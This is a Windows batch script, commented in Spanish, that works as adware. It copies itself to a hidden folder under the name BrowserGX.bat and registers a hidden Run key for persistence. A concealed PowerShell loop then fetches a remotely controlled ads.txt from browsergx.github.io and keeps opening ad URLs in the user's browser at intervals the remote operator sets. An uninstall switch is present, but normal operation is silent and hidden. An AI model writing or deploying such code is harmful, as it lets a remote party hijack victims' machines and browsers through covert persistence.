@echo off
REM Oculta los comandos en consola mientras se ejecuta el archivo por lotes.

REM Define la carpeta de destino en el perfil local del usuario (%LOCALAPPDATA%\ADS).
set "CARPETA_ADS=%LOCALAPPDATA%\ADS"

REM Define la ruta completa del archivo .bat que vivira dentro de %LOCALAPPDATA%\ADS.
set "BAT_DESTINO=%CARPETA_ADS%\BrowserGX.bat"

REM Define la ruta del Registro de Windows para iniciar aplicaciones al arrancar sesion.
set "REG_KEY=HKCU\Software\Microsoft\Windows\CurrentVersion\Run"

REM Define el nombre de la entrada que se guardara en el Registro.
set "REG_NAME=RotadorAdsPS"

REM Si el primer argumento pasado al .bat es --uninstall (sin importar mayusculas/minusculas):
if /i "%~1"=="--uninstall" (
    REM Elimina la entrada del Registro para que no vuelva a iniciar con Windows.
    reg delete "%REG_KEY%" /v "%REG_NAME%" /f >nul 2>&1

    REM Busca procesos powershell.exe que contengan RotadorAdsMutex y los cierra a la fuerza.
    powershell -NoProfile -Command "Get-CimInstance Win32_Process -Filter \"Name='powershell.exe'\" | Where-Object { $_.CommandLine -like '*RotadorAdsMutex*' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force }" >nul 2>&1

    REM Borra de forma recursiva y silenciosa la carpeta %LOCALAPPDATA%\ADS.
    rmdir /s /q "%CARPETA_ADS%" >nul 2>&1

    REM Sale del script tras completar la desinstalacion.
    exit
)

REM Define el bucle principal en PowerShell:
REM 1) Fuerza TLS 1.2 y crea un Mutex global para evitar instancias duplicadas.
REM 2) En cada vuelta: descarga ads.txt sin cache, ignora comentarios (#) y lineas vacias.
REM 3) Lee 'activo' (0/1 o true/false) e 'interval' (entre 10 y 86400 segundos).
REM 4) Si esta activo, elige una URL al azar (evitando repetir la ultima si hay mas de una) y abre go.html?url=...
REM 5) Captura errores sin romper el bucle y espera $espera segundos antes de la siguiente vuelta.
set "PS_LOOP=[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $created = $false; $mutex = New-Object System.Threading.Mutex($true, 'Global\RotadorAdsMutex', [ref]$created); if (-not $created) { exit }; $ultimaUrl = ''; while ($true) { $espera = 3600; try { $nocache = 'https://browsergx.github.io/ads/ads.txt?t=' + [DateTimeOffset]::UtcNow.ToUnixTimeSeconds(); $resp = Invoke-WebRequest -Uri $nocache -UseBasicParsing -TimeoutSec 15; $lineas = @($resp.Content -split \"`r?`n\" | ForEach-Object { $_.Trim() } | Where-Object { $_ -ne '' -and -not $_.StartsWith('#') }); $actLine = $lineas | Where-Object { $_ -match '^activo\s*=\s*(0|1|true|false)$' } | Select-Object -First 1; $activo = $true; if ($actLine) { $valAct = ($actLine -split '=')[1].Trim().ToLower(); $activo = ($valAct -eq '1' -or $valAct -eq 'true') }; $intLine = $lineas | Where-Object { $_ -match '^interval\s*=\s*\d+$' } | Select-Object -First 1; if ($intLine) { $valInt = [int]($intLine -split '=')[1].Trim(); if ($valInt -ge 10 -and $valInt -le 86400) { $espera = $valInt } }; if ($activo) { $urls = @($lineas | Where-Object { $_ -match '^https?://' }); if ($urls.Count -gt 0) { $candidatas = $urls; if ($urls.Count -gt 1 -and -not [string]::IsNullOrWhiteSpace($ultimaUrl)) { $filtradas = @($urls | Where-Object { $_ -ne $ultimaUrl }); if ($filtradas.Count -gt 0) { $candidatas = $filtradas } }; $idx = Get-Random -Minimum 0 -Maximum $candidatas.Count; $elegida = $candidatas[$idx]; if (-not [string]::IsNullOrWhiteSpace($elegida)) { $ultimaUrl = $elegida; $encoded = [uri]::EscapeDataString($elegida); $destino = 'https://browsergx.github.io/ads/go.html?url=' + $encoded; Start-Process -FilePath $destino } } } } catch {}; Start-Sleep -Seconds $espera }"

REM Si rotador_ads.bat aun no existe en %LOCALAPPDATA%\ADS:
if not exist "%BAT_DESTINO%" (
    if not exist "%CARPETA_ADS%" (
        mkdir "%CARPETA_ADS%" >nul 2>&1
    )
    copy /y "%~f0" "%BAT_DESTINO%" >nul 2>&1
)

REM Consulta si ya existe el valor RotadorAdsPS en el Registro; si no existe, lo crea.
reg query "%REG_KEY%" /v "%REG_NAME%" >nul 2>&1
if %errorlevel% neq 0 (
    reg add "%REG_KEY%" /v "%REG_NAME%" /t REG_SZ /d "powershell.exe -NoProfile -WindowStyle Hidden -Command \"Start-Process -FilePath '%BAT_DESTINO%' -WindowStyle Hidden\"" /f >nul
)

REM Si el script se ejecuto desde fuera de %LOCALAPPDATA%\ADS, lanza la copia de destino oculta y cierra este proceso.
if /i not "%~f0"=="%BAT_DESTINO%" (
    start "" /min powershell.exe -NoProfile -WindowStyle Hidden -Command "Start-Process -FilePath '%BAT_DESTINO%' -WindowStyle Hidden"
    exit
)

REM Ejecuta el bucle de PowerShell de forma oculta (-WindowStyle Hidden) sin cargar perfil (-NoProfile).
powershell.exe -NoProfile -WindowStyle Hidden -Command "%PS_LOOP%"

REM Finaliza el proceso .bat.
exit
